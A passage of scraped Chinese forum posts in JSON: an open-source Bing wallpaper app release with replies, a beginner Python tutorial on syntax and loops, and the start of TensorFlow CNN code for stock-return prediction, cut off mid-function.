{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"enter image description here\" src=\"http://preview.cloud.189.cn/image/imageAction?param=35AA87175086AF61EF971EEA7554C2166FB43943ED0CB1FF59C6D04FC888A0D0619D8F131D1B46DDFD6321DBE4554AF6282F20C2D568D8675B85E0E355C6A5B89E5262354EBA7F08B5819159EA48805A3BFF90B7EAA184541B38A3AD\"></p>\n<p><img alt=\"enter image description here\" src=\"http://preview.cloud.189.cn/image/imageAction?param=5C8823BF0F906F0C0AD52FD491BBBD292917C9D4C62C93D0AEB27070A73BA5E1F7016E160A6A2BE9B76A06D69AEDD0006D8253F22775B634F9C642A6DBB2B1F076792E4AC8BF4DFF4F335D6B6A0C209203B2EBADAFDF63E48268DF70\"></p>\n<p>必应好壁纸 3.1 将为你的桌面注入新的活力，它每天都会为你更新来自微软必应搜索的高品质壁纸！</p>\n<p>每天盯着相同的桌面壁纸总让人感到疲倦和乏味，何不让桌面壁纸自动更换呢？</p>\n<p>必应好壁纸：每一张令人心旷神怡的壁纸后面都有一个真实的故事让你心动，让必应壁纸带你环球旅行吧，换一张壁纸，换一种心情！</p>\n<p>软件专页： <a href=\"http://mathjoy.lofter.com/post/42208d_7cabcf7\" rel=\"nofollow\">http://mathjoy.lofter.com/post/42208d_7cabcf7</a></p>\n<p>开源地址： <a href=\"https://github.com/redstoneleo/BingNiceWallpapers\" rel=\"nofollow\">https://github.com/redstoneleo/BingNiceWallpapers</a></p>\n<p>可以运行在 Windows 和 Linux 上面</p>\n<p>本次更新了：</p>\n<ol>\n<li>修复微软必应壁纸源；</li>\n<li>增加了换壁纸（解决 Ubuntu 等点击托盘图标无法换壁纸的系统的问题）、删除当前壁纸这两个托盘图标菜单；</li>\n<li>修复重复下载昨天的壁纸 bug ；</li>\n</ol>\n</div></div>"], "reply": "18", "tittle": "[更新+开源] 必应好壁纸 3.1 发布，并且开源", "comment": ["赞一个", "怒赞，已下！", "棒", "怒赞，已下！", "python 练手项目", "拿走了，回复一下表示感谢", "\r", "这是我前一段时间写的😂超级简陋", "不错", "我维护了两年的壁纸网站：\r", "\r", "每天定时抓取第二天的壁纸，可以提前看到明天的壁纸。\r", "因为必应给不同国家推送的壁纸有不同，所以我抓取 11 个国家的内容，然后去重，生成这个页面： ", "\r", "提供多种分辨率下载，目前积累了 2015 年 2 月至今的 1500+ 张壁纸。\r", "部分壁纸有视频供观赏，中国区的壁纸还有微软小娜的文字介绍。", "Win10 用户还可以看下我朋友开发的 UWP 应用“碧影壁纸”，由我提供数据。\r", "一不小心被层主 @", " 安利。此外我也安利一款一直在用的 UWP 应用： MyerSplash 。壁纸源是 Unsplash 。", "赞！\r", "\r", "建议加一个 license file 。", " 不支持 py3 呢\r", "from StringIO import StringIO ---->  from io import StringIO", " 不明白 license 有什么作用？又有多少人会去遵守", " 打官司的时候，还是需要的。", "mark", "提一个软件逻辑上的问题\r", "壁纸更换只是随机显示下载好的所有壁纸吧\r", "这样就没法突显每天更新的壁纸了？而且循环的话一直都是循环的老壁纸，反倒不好看，把循环间隔设置成一天的话可以自动每天显示更新的壁纸吗", " 已改，最新版可以设置时分秒了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>Python 的诞生</h2>\n<p>Python 是著名的\"<code>龟叔</code>\"<code>Guido van Rossum(吉多·范罗苏姆)</code>在 1989 年圣诞节期间，为了打发无聊的圣诞节而编写的一个编程语言。</p>\n<p><img alt=\"guide\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483014338667.jpg\" title=\"guide\"></p>\n<p>Python 语法很多来自 C ，但又受到 ABC 语言的强烈影响，来自 ABC 语言的一些规定直到今天还富有争议，比如强制缩进，但这些语法规定让 Python 变得更易读。</p>\n<p><code>Guido van Rossum</code>著名的一句话就是**<code>Life is short, you need Python</code><strong>，译为：</strong><code>人生苦短，我用 Python</code>**，一直到现在，无论在任何介绍 Python 这门强大的语言时，都会有提到。</p>\n<p>截至到目前<code>2017 年 1 月 6 日</code>， Python 在<code>Tiobe</code>的排名还是很靠前的，而且近几年来说 Python 上升的趋势还是特别稳定的，这两年一直保持在第四位，甚至已经超越 PHP 和 C#。</p>\n<p><img alt=\"Tiobe\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483685458.png\" title=\"Tiobe\"></p>\n<p>查询网站： <a href=\"http://www.tiobe.com/tiobe_index?page=index\" rel=\"nofollow\">http://www.tiobe.com/tiobe_index?page=index</a></p>\n<p>我们还可以再解释下下通过<code>import this</code>查看 Python 语言的设计哲学：</p>\n<pre><code>&gt;&gt;&gt; import this\nThe Zen of Python, by Tim Peters\n\nBeautiful is better than ugly.\nExplicit is better than implicit.\nSimple is better than complex.\nComplex is better than complicated.\nFlat is better than nested.\nSparse is better than dense.\nReadability counts.\nSpecial cases aren't special enough to break the rules.\nAlthough practicality beats purity.\nErrors should never pass silently.\nUnless explicitly silenced.\nIn the face of ambiguity, refuse the temptation to guess.\nThere should be one-- and preferably only one --obvious way to do it.\nAlthough that way may not be obvious at first unless you're Dutch.\nNow is better than never.\nAlthough never is often better than *right* now.\nIf the implementation is hard to explain, it's a bad idea.\nIf the implementation is easy to explain, it may be a good idea.\nNamespaces are one honking great idea -- let's do more of those!\n</code></pre>\n<p>Python 唯一的缺点就是他的性能，它达不到像 C 和 C++这种编译性语言运行的那么快，但是我们通常都不需要考虑这个问题，因为有<code>PYPY</code>，它的运行速度比默认的<code>Cpython</code>要快很多。</p>\n<h2>在 Win10 下安装 Python3</h2>\n<p><strong>下载 Python 解释器</strong></p>\n<p>64 位下载地址： <a href=\"https://www.python.org/ftp/python/3.5.2/python-3.5.2-amd64.exe\" rel=\"nofollow\">https://www.python.org/ftp/python/3.5.2/python-3.5.2-amd64.exe</a>\n32 位下载地址： <a href=\"https://www.python.org/ftp/python/3.5.2/python-3.5.2.exe\" rel=\"nofollow\">https://www.python.org/ftp/python/3.5.2/python-3.5.2.exe</a></p>\n<p><strong>安装 Python 解释器</strong></p>\n<p>下载下来之后双击安装，在安装的时候稍微需要注意一下就是需要修改默认的安装路径和和自动注册到系统环境变量勾选上。</p>\n<p><img alt=\"python\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483690871.png\" title=\"python\"></p>\n<p><img alt=\"python\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483691055.png\" title=\"python\"></p>\n<p>然后就可以点击<code>Install</code>按钮进行安装了。</p>\n<p><img alt=\"python\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483691189.png\" title=\"python\"></p>\n<blockquote>\n<p>因为我们已经勾选自动注册环境变量，所以在这里就不需要修改环境变量，直接运行即可；</p>\n</blockquote>\n<p><strong>DOS 测试</strong></p>\n<p>右键开始菜单选择<code>命令提示符</code>，打开 CMD 窗口，</p>\n<p><img alt=\"python\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483691401.png\" title=\"python\"></p>\n<p><img alt=\"python\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483691480.png\" title=\"python\"></p>\n<p>在 cmd 窗口中输入<code>python -V</code>指令查看安装的 Python 版本：</p>\n<p><img alt=\"python\" src=\"https://blog.ansheng.me/static/uploads/2017/01/1483691631.png\" title=\"python\"></p>\n<p>如果你得到的结果和我一样，那么你就安装好了<code>windows</code>下的<code>python</code>环境。</p>\n<p>因为在<code>Mac os</code>和其他<code>unix</code>和<code>Linux</code>版本下都已经自带了 Python ，这里我就不做太多介绍了。</p>\n<h2>Python 实现方式</h2>\n<p>Python 身为一门编程语言，但是他是有多种实现方式的，这里的实现指的是符合 Python 语言规范的 Python 解释程序以及标准库等。</p>\n<p>Python 的实现方式主要分为三大类</p>\n<ol>\n<li>Cpython</li>\n<li>Jpython</li>\n<li>IronPython</li>\n</ol>\n<h3>CPython</h3>\n<p><code>Cpython</code>是默认的 Python 解释器，这个名字根据它是可移植的<code>ANSI C</code>语言代码编写而成的这事实而来的。</p>\n<p>当执行 Python 执行代码的时候，会启用一个 Python 解释器，将源码<code>(.py)</code>文件读取到内存当中，然后编译成字节码<code>(.pyc)</code>文件，最后交给 Python 的虚拟机<code>(PVM)</code>逐行解释并执行其内容，然后释放内存，退出程序。</p>\n<p><img alt=\"python-day01-04\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483015581.png\"></p>\n<p>当第二次在执行当前程序的时候，会先在当前目录下寻找有没有同名的 pyc 文件，如果找到了，则直接进行运行，否则重复上面的工作。</p>\n<p>pyc 文件的目的其实就是为了实现代码的重用，为什么这么说呢？因为 Python 认为只要是 import 导入过来的文件，就是可以被重用的，那么他就会将这个文件编译成 pyc 文件。</p>\n<p>python 会在每次载入模块之前都会先检查一下 py 文件和 pyc 文件的最后修改日期，如果不一致则重新生成一份 pyc 文件，否则就直接读取运行。</p>\n<h3>Jython</h3>\n<p>Jython 是个 Python 的一种实现方式， Jython 编译 Python 代码为 Java 字节码，然后由 JVM （ Java 虚拟机）执行，这意味着此时 Python 程序与 Java 程序没有区别，只是源代码不一样。此外，它能够导入和使用任何 Java 类像 Python 模块。</p>\n<h3>IronPython</h3>\n<p>IronPython 是 Python 的 C#实现，并且它将 Python 代码编译成 C#中间代码（与 Jython 类似），然后运行，<a href=\"http://%E5%AE%83%E4%B8%8E.NET\" rel=\"nofollow\">它与.NET</a> 语言的互操作性也非常好。</p>\n<h2>Python 简单入门</h2>\n<h3>Hello Word</h3>\n<p>一般情况下程序猿的第一个小程序都是简单的输出<code>Hello Word!</code>，当然 Python 也不例外，下面就让我们来用 Python 输出一句<code>Hello Word!</code>吧！</p>\n<p>创建一个以 py 结尾的文件</p>\n<pre><code>[root@ansheng python_code]# touch hello.py\n</code></pre>\n<p>其内容为</p>\n<pre><code>#!/usr/vin/env python\n\nprint \"Hello Word!\"\n</code></pre>\n<p>用 Python 执行</p>\n<pre><code>[root@ansheng python_code]# python hello.py\nHello Word!\n</code></pre>\n<p>输出的内容为<code>Hello Word!</code>， OK ，你的第一次一句木有了^_^</p>\n<h3>指定 Python 解释器</h3>\n<p>在 Python 文件的开头加入以下代码就制定了解释器。</p>\n<p>第一种方式</p>\n<pre><code>#!/usr/bin/python\n</code></pre>\n<p>告诉 shell 这个脚本用<code>/usr/bin/python</code>执行</p>\n<p>第二种方式</p>\n<pre><code>#!/usr/bin/env python\n</code></pre>\n<p>在操作系统环境不同的情况下指定执行这个脚本用 python 来解释。</p>\n<h3>执行 Python 文件</h3>\n<p>执行 Python 文件的方式有两种</p>\n<p>例如<code><a href=\"http://hello.py\" rel=\"nofollow\">hello.py</a></code>的文件内容为</p>\n<pre><code>#!/usr/bin/env python\nprint \"Life is short, you need Pytho\"\n</code></pre>\n<p>第一种执行方式</p>\n<pre><code>[root@ansheng python_code]# python my.py\nLife is short, you need Pytho\n</code></pre>\n<p>如果使用<code>python <a href=\"http://my.py\" rel=\"nofollow\">my.py</a></code>这种方式执行，那么<code>#!/usr/bin/python</code>会被忽略，等同于注释。</p>\n<p>第二种执行方式</p>\n<pre><code>[root@ansheng python_code]# chmod +x my.py \n[root@ansheng python_code]# ./my.py \nLife is short, you need Pytho\n</code></pre>\n<p>如果使用<code>./<a href=\"http://my.py\" rel=\"nofollow\">my.py</a></code>来执行，那么<code>#!/usr/bin/python</code>则是指定解释器的路径，在执行之前<code><a href=\"http://my.py\" rel=\"nofollow\">my.py</a></code>这个文件必须有执行权限。</p>\n<p><code>python <a href=\"http://my.py\" rel=\"nofollow\">my.py</a></code> 实则就是在<code><a href=\"http://my.py\" rel=\"nofollow\">my.py</a></code>文件顶行加入了<code>#!/usr/bin/python</code></p>\n<h3>指定字符编码</h3>\n<p>python 制定字符编码的方式有多种，而编码格式是要写在解释器的下面的，常用的如下面三种:</p>\n<p>第一种</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n</code></pre>\n<p>第二种</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n</code></pre>\n<p>第三种</p>\n<pre><code>#!/usr/bin/env python\n# coding:utf-8\n</code></pre>\n<h2>代码注释</h2>\n<h3>单行注释</h3>\n<p>单行注释只需要在代码前面加上<code>#</code>号</p>\n<pre><code># 注释内容\n</code></pre>\n<h3>多行注释</h3>\n<p>多行注释用三个单引号或者三个双引号躲起来</p>\n<pre><code>\"\"\"\n注释内容\n\"\"\"\n</code></pre>\n<h3>实例</h3>\n<p><code>py</code>脚本原文件内容</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nprint \"My name is Ansheng\"\nprint \"I'm a Python developer\"\nprint \"My blog URL: https://blog.ansheng.me\"\nprint \"Life is short, you need Pytho\"\n</code></pre>\n<p>源文件输出的内容</p>\n<pre><code>[root@ansheng python_code]# python note.py \nMy name is Ansheng\nI'm a Python developer\nMy blog URL: https://blog.ansheng.me\nLife is short, you need Pytho\n</code></pre>\n<h4>单行注释演示</h4>\n<p>代码改为</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nprint \"My name is Ansheng\"\nprint \"I'm a Python developer\"\nprint \"My blog URL: https://blog.ansheng.me\"\n#print \"Life is short, you need Pytho\"\n</code></pre>\n<p>执行结果</p>\n<pre><code>[root@ansheng python_code]# python note.py \nMy name is Ansheng\nI'm a Python developer\nMy blog URL: https://blog.ansheng.me\n</code></pre>\n<p>结果<code>Life is short, you need Pytho</code>print 出来</p>\n<h4>多行注释演示</h4>\n<p>代码改为</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nprint \"My name is Ansheng\"\n\"\"\"\nprint \"I'm a Python developer\"\nprint \"My blog URL: https://blog.ansheng.me\"\nprint \"Life is short, you need Pytho\"\n\"\"\"\n</code></pre>\n<p>执行结果</p>\n<pre><code>[root@ansheng python_code]# python note.py \nMy name is Ansheng\n</code></pre>\n<p>结果<code>I'm a Python developer</code>、<code>My blog URL: <a href=\"https://blog.ansheng.me\" rel=\"nofollow\">https://blog.ansheng.me</a></code>、<code>Life is short, you need Pytho</code>都没有 print 出来</p>\n<h3>print 输出多行</h3>\n<p>既然用单个单引号或者多引号可以注释多行，那么能不能 print 多行呢？</p>\n<p>代码</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nprint \"\"\"\nMy name is Ansheng\nI'm a Python developer\nMy blog URL: https://blog.ansheng.me\nLife is short, you need Python.\n\"\"\"\n</code></pre>\n<p>执行结果</p>\n<pre><code>[root@ansheng python_code]# python note.py \n\nMy name is Ansheng\nI'm a Python developer\nMy blog URL: https://blog.ansheng.me\nLife is short, you need Python.\n\n</code></pre>\n<p>显然这是可以得 ^_^</p>\n<h2>变量</h2>\n<p>变量的命名规则:</p>\n<ol>\n<li>变量名只能包含数字、字幕、下划线</li>\n<li>不能以数字开头</li>\n<li>变量名不能使 python 内部的关键字</li>\n</ol>\n<p>Python 内部已占用的关键字</p>\n<pre><code>['and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'exec', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'not', 'or', 'pass', 'print', 'raise', 'return', 'try', 'while', 'with', 'yield']\n</code></pre>\n<h3>定义变量</h3>\n<pre><code>&gt;&gt;&gt; name = \"ansheng\"\n&gt;&gt;&gt; print name\nansheng\n</code></pre>\n<h2>基本的数据类型</h2>\n<h3>字符串(str)</h3>\n<p>定义字符串类型是需要用单引号或者双引号包起来的</p>\n<pre><code>&gt;&gt;&gt; name = \"ansheng\"\n&gt;&gt;&gt; print(type(name))\n&lt;type 'str'&gt;\n</code></pre>\n<p>或者</p>\n<pre><code>&gt;&gt;&gt; name = 'ansheng'\n&gt;&gt;&gt; print(type(name))\n&lt;type 'str'&gt;\n</code></pre>\n<h3>数字(int)</h3>\n<p>整数类型定义的时候变量名后面可以直接跟数字，不要用双引号包起来。</p>\n<pre><code>&gt;&gt;&gt; age = 20\n&gt;&gt;&gt; print(type(age))\n&lt;type 'int'&gt;\n</code></pre>\n<h3>布尔值</h3>\n<p>布尔值就只有<code>True(真)</code>，<code>Flash(假)</code></p>\n<pre><code>&gt;&gt;&gt; if True:\n...  print(\"0\")\n... else:\n...  print(\"1\")\n...\n0\n</code></pre>\n<p><strong>解释：</strong>如果为真则输出 0 ，否则输出 1</p>\n<h2>流程控制</h2>\n<h3>if 语句</h3>\n<p><code>if</code>语句是用来检查一个条件：如果条件为真(true)，我们运行一个语句块（你为 if 块），否则(else)，我们执行另一个语句块（称为 else 块）， else 子语句是可选的。</p>\n<h4>单条件</h4>\n<p>例题：如果 num 变量大于 1 ，那么就输出 num 大，否则就输出 num 小， num 值为 5 。</p>\n<p>代码</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding:utf-8 -*-\nnum = 5\n\nif num &gt; 1:\n print(\"num 大\")\nelse:\n print(\"num 小\")\n</code></pre>\n<p>结果</p>\n<pre><code>[root@ansheng python_code]# python num.py\nnum 大\n</code></pre>\n<h4>多条件</h4>\n<p>例题：如果 num 变量大于 5 ，那么就输出 num 大于 5 ，如果 num 变量小于 5 ，那么就输出 num 小于 5 ，否则就输出 num 等于 5 ， num 值为 5 。</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding:utf-8 -*-\nnum = 5\n\nif num &gt; 5:\n print(\"num 大于 5\")\nelif num &lt; 5:\n print(\"num 小于 5\")\nelse:\n print(\"num 等于 5\")\n</code></pre>\n<p>结果</p>\n<pre><code>[root@ansheng python_code]# python num.py\nnum 等于 5\n</code></pre>\n<h3>while 循环</h3>\n<p>while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。\n执行流程图如下</p>\n<p><img alt=\"while\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483015647.png\"></p>\n<p>实例：</p>\n<p>定义一个变量 count ，默认值为 1 ，然后进去 while 循环，让其输出 1-10 ，如果大于 10 则退出。</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\n\nprint \"Start....\"\n\nwhile count &lt; 11:\n print \"The count is:\",count\n count += 1\n\nprint \"End....\"\n</code></pre>\n<p>执行结果如下</p>\n<pre><code>[root@ansheng python_code]# python while.py\nStart....\nThe count is: 1\nThe count is: 2\nThe count is: 3\nThe count is: 4\nThe count is: 5\nThe count is: 6\nThe count is: 7\nThe count is: 8\nThe count is: 9\nThe count is: 10\nEnd....\n</code></pre>\n<h3>break</h3>\n<p>跳出当前循环体，下面代码不再执行，继续执行循环后面的代码</p>\n<p>实例</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\n\nprint \"Start....\"\n\nwhile count &lt; 11:\n if count == 5:   #如果 count 等于 5 ，那么我就退出当前循环体\n  break\n print \"The count is:\",count\n count += 1\n\nprint \"End....\"\n</code></pre>\n<p>输出结果</p>\n<pre><code>[root@ansheng python_code]# python while.py\nStart....\nThe count is: 1\nThe count is: 2\nThe count is: 3\nThe count is: 4\nEnd....\n</code></pre>\n<h3>continue</h3>\n<p>跳出本次循环，继续下一次循环</p>\n<p>代码</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\n\nprint \"Start....\"\n\nwhile count &lt; 11:\n if count == 5:\t\t#如果 count 等于 5 ，那么我就让其+1 ，然后不执行下面的代码，继续下一次循环\n  count += 1\n  continue\n print \"The count is:\",count\n count += 1\n\nprint \"End....\"\n</code></pre>\n<p>输出结果</p>\n<pre><code>[root@ansheng python_code]# python while.py\nStart....\nThe count is: 1\nThe count is: 2\nThe count is: 3\nThe count is: 4\nThe count is: 6\nThe count is: 7\nThe count is: 8\nThe count is: 9\nThe count is: 10\nEnd....\n</code></pre>\n<h3>条件判断</h3>\n<p>条件判断适用于<code>if</code>、<code>while</code>等。</p>\n<p>等于</p>\n<pre><code>if 1 == 1:\n</code></pre>\n<p>不等于</p>\n<pre><code>if 1 != 2:\n</code></pre>\n<p>小于</p>\n<pre><code>if 1 &lt; 1\n</code></pre>\n<p>大于</p>\n<pre><code>if 1 &gt; 1:\n</code></pre>\n<p>并且</p>\n<pre><code>if 1 == 1 and 1 &gt; 0:\n</code></pre>\n<p>或者</p>\n<pre><code>if 2 &gt; 1 or 2 = 2:\n</code></pre>\n<p>永远为真</p>\n<pre><code>if True:\n</code></pre>\n<p>永远为假</p>\n<pre><code>if Flase:\n</code></pre>\n<h2>交互式输入</h2>\n<p>Python 的交互式输入使用的是<code>input()</code>函数实现的，注意在<code>Python2.7.x</code>版本的时候可以使用<code>raw_input()</code>和<code>input()</code>函数，但是在<code>Python3.5.x</code>版本的时候就没有<code>raw_input()</code>函数了,只能够使用<code>input()</code></p>\n<p>例题：用户在执行脚本的时候，让他输入自己的名字，然后打印出来。</p>\n<p>代码</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nusername = input(\"请输入你的名字：\")\nprint(\"你的名字是：\", username)\n</code></pre>\n<p>执行结果</p>\n<pre><code>[root@ansheng python_code]# python input.py\n请输入你的名字：安生   # 输入你的名字\n你的名字是： 安生      # 打印出你的名字\n</code></pre>\n<h2>练习题</h2>\n<h3>使用 while 循环输入 1 2 3 4 5 6   8 9 10</h3>\n<p><strong><code>思路：</code></strong> 首先定义一个变量 num,值为 1,然后用 while 循环输出 1-10 的内容,在 while 循环内加入 if 语句,判断当前的值如果是 7,那么就让 7+1,加完之后跳出本次循环,不执行下面的 print,7 跳出本次循环之后,第二轮的时候 num 就是 8 了,而不是 7.</p>\n<p>代码</p>\n<pre><code>#!/use/bin/env python\n# _*_ coding:utf-8 _*_\n\nnum = 1\nwhile num &lt; 11:\n    if num == 7:\n        num += 1\n        continue\n    print(num)\n    num += 1\n</code></pre>\n<p>输出内容为：</p>\n<pre><code>1\n2\n3\n4\n5\n6\n8\n9\n10\n</code></pre>\n<h3>求 1-100 的所有数的和</h3>\n<p>**<code>思路：</code>**定义两个变量，分别是 count 和 num ，利用 while 语句循环输出 1-100 ，然后每次就让 count+num ，这样循环一百次之后相加的结果就是 1 到 100 的和了。</p>\n<p>代码</p>\n<pre><code>#!/use/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\nnum = 0\nwhile count &lt; 101:\n    num = num + count\n    count += 1\n\nprint(num)\n</code></pre>\n<p>输出结果</p>\n<pre><code>5050\n</code></pre>\n<h3>输出 1-100 内的所有奇数</h3>\n<p><strong><code>思路：</code></strong> 利用<code>%</code>整数相除的余，如果余数是 1 那么当前的 count 就是奇数，如果余 0 ，那么当前的 count 就是偶数。</p>\n<p>代码</p>\n<pre><code>#!/use/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\n\nwhile count &lt; 101:\n    num = count % 2\n    if num == 1:\n        print(count)\n    count += 1\n</code></pre>\n<p>结果自己执行看</p>\n<h3>输出 1-100 内的所有偶数</h3>\n<p>代码</p>\n<pre><code>#!/use/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\n\nwhile count &lt; 101:\n    num = count % 2\n    if num == 0:\n        print(count)\n    count += 1\n</code></pre>\n<p>结果自己执行看</p>\n<h3>求 1-2+3-4+5 ... 99 的所有数的和</h3>\n<pre><code>#!/use/bin/env python\n# _*_ coding:utf-8 _*_\n\ncount = 1\n\nwhile count &lt; 100:\n    if count == 1:\n        num = count\n    elif count % 2 == 1:\n        num = num + count\n    elif count % 2 == 0:\n        num = num - count\n    count += 1\n\nprint(num)\n</code></pre>\n<p>结果</p>\n<pre><code>50 \n</code></pre>\n<h3>用户登陆</h3>\n<p>需求：写一个脚本，用户执行脚本的时候输入用户名和密码，如果用户米或者密码连续三次输入错误则退出，如果输入正确则显示登陆成功，然后退出。</p>\n<p>用户名和密码自己定义</p>\n<ul>\n<li>图解用户登录流程</li>\n</ul>\n<p><img alt=\"python-day01-10\" src=\"https://blog.ansheng.me/static/uploads/2016/12/1483015715.png\"></p>\n<ul>\n<li>代码</li>\n</ul>\n<pre><code>#!/use/bin/env python\n# _*_ coding:utf-8 _*_\nimport getpass\n\n# username ： ansheng\n# userpass ： 666666\n\ncount = 3\n\nwhile count &gt; 0:\n    username = input(\"User Name:\")\n    userpass = getpass.getpass(\"pass:\")\n    if username == \"ansheng\" and userpass == \"666666\":\n        print \"User:\", username, \",login successful!\"\n        break\n    else:\n        count -= 1\n        if count != 0:\n            print \"Login failed\", count\n        else:\n            print(\"The maximum number of login!\")\n</code></pre>\n<p>登陆成功演示</p>\n<pre><code>User Name:ansheng  #输入用户名\npass:              #输入密码，密码是看不到的，因为调用了 getpass 模块\nUser: ansheng ,login successful!  #显示用户 ansheng ，登陆成功\n</code></pre>\n<p>登陆失败演示</p>\n<pre><code>User Name:as\npass:\nLogin failed 2\nUser Name:an\npass:\nLogin failed 1\nUser Name:ansea\npass:\nThe maximum number of login!\n</code></pre>\n<p>账号或密码连续三次输入错误则退出程序，并且每次提醒用户升序多少次登陆的机会。</p>\n<p>原文地址： <a href=\"https://blog.ansheng.me/article/python-full-stack-way-basics/\" rel=\"nofollow\">https://blog.ansheng.me/article/python-full-stack-way-basics/</a>\n<a href=\"https://blog.ansheng.me/article/python-full-stack-way/\" rel=\"nofollow\">Python全栈之路系列文章</a></p>\n</div></div>"], "reply": "4", "tittle": "Python 全栈之路系列之基础篇", "comment": ["牛牛", "  其实我很菜，不要告诉别人", "已经收藏，看到有声明还没系列更新完？", " 还在更，主要是整理下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到一个不错的深度学习做预测，在这里分享给大家。</p>\n<p>配置环境 deepin 15.3 Anaconda 2.7 pip 清华镜像 tensorflow</p>\n<pre><code>%%time\nfrom __future__ import division\nfrom __future__ import print_function  \nimport numpy as np\nimport pandas as pd\nimport matplotlib.pylab as plt\n%matplotlib inline\nimport seaborn as sns\n\n​\nimport tensorflow as tf\n\n​\nfac = np.load('/home/big/Quotes/TensorFlow deal with Uqer/fac16.npy').astype(np.float32)\nret = np.load('/home/big/Quotes/TensorFlow deal with Uqer/ret16.npy').astype(np.float32)\n#fac = np.load('/home/big/Quotes/TensorFlow deal with Uqer/fac16.npy')\n#ret = np.load('/home/big/Quotes/TensorFlow deal with Uqer/ret16.npy')\n\n​\n# Parameters\nlearning_rate = 0.001 # 学习速率，\ntraining_iters = 20 # 训练次数\nbatch_size = 1024 # 每次计算数量 批次大小\ndisplay_step = 10 # 显示步长\n\n​\n# Network Parameters\nn_input = 40*17 # 40 天×17 多因子\nn_classes = 7 # 根据涨跌幅度分成 7 类别\n# 这里注意要使用 one-hot 格式，也就是如果分类如 3 类 -1,0,1 则需要 3 列来表达这个分类结果， 3 类是-1 0 1 然后是哪类，哪类那一行为 1 否则为 0\ndropout = 0.8 # Dropout, probability to keep units\n\n​\n# tensorflow 图 Graph 输入 input ，这里的占位符均为输入\nx = tf.placeholder(tf.float32, [None, n_input])\ny = tf.placeholder(tf.float32, [None, n_classes])\nkeep_prob = tf.placeholder(tf.float32) #dropout (keep probability)\n\n</code></pre>\n<p>2 层</p>\n<pre><code># 2 层 CNN\ndef CNN_Net_two(x,weights,biases,dropout=0.8,m=1):\n    # 将输入张量调整成图片格式\n    # CNN 图像识别，这里将前 40 天的多因子数据假设成图片数据\n    x = tf.reshape(x, shape=[-1,40,17,1])\n    \n    # 卷积层 1\n    x = tf.nn.conv2d(x, weights['wc1'], strides=[1,m,m,1],padding='SAME')\n    # x*W + b\n    x = tf.nn.bias_add(x,biases['bc1'])\n    # 激活函数\n    x = tf.nn.relu(x)\n    \n    # 卷积层 2 感受野 5 5 16 64 移动步长 1\n    x = tf.nn.conv2d(x, weights['wc2'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc2'])\n    x = tf.nn.relu(x)\n    \n    # 全连接层\n    x = tf.reshape(x,[-1,weights['wd1'].get_shape().as_list()[0]])\n    x = tf.add(tf.matmul(x,weights['wd1']),biases['bd1'])\n    x = tf.nn.relu(x)\n    \n    # Apply Dropout\n    x = tf.nn.dropout(x,dropout)\n    # Output, class prediction\n    x = tf.add(tf.matmul(x,weights['out']),biases['out'])\n    return x\n\n# Store layers weight &amp; bias\nweights = {\n    'wc1': tf.Variable(tf.random_normal([5, 5, 1, 16])),\n    'wc2': tf.Variable(tf.random_normal([5, 5, 16, 64])),\n    # fully connected, 7*7*64 inputs, 1024 outputs\n    'wd1': tf.Variable(tf.random_normal([40*17*64, 1024])),\n    'out': tf.Variable(tf.random_normal([1024, n_classes]))\n}\n\nbiases = {\n    'bc1': tf.Variable(tf.random_normal([16])),\n    'bc2': tf.Variable(tf.random_normal([64])),\n    'bd1': tf.Variable(tf.random_normal([1024])),\n    'out': tf.Variable(tf.random_normal([n_classes]))\n}\n\n</code></pre>\n<p>3 层</p>\n<pre><code>def CNN_Net_three(x,weights,biases,dropout=0.8,m=1):\n    \n    x = tf.reshape(x, shape=[-1,40,17,1])\n    \n    # 卷积层 1\n    x = tf.nn.conv2d(x, weights['wc1'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc1'])\n    x = tf.nn.relu(x)\n    \n    # 卷积层 2 \n    x = tf.nn.conv2d(x, weights['wc2'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc2'])\n    x = tf.nn.relu(x)\n    \n    # 卷积层 3 \n    x = tf.nn.conv2d(x, weights['wc3'], strides=[1,m,m,1],padding='SAME')\n    x = tf.nn.bias_add(x,biases['bc3'])\n    x = tf.nn.relu(x)    \n    \n    # 全连接层\n    x = tf.reshape(x,[-1,weights['wd1'].get_shape().as_list()[0]])\n    x = tf.add(tf.matmul(x,weights['wd1']),biases['bd1'])\n    x = tf.nn.relu(x)\n    \n    # Apply Dropout\n    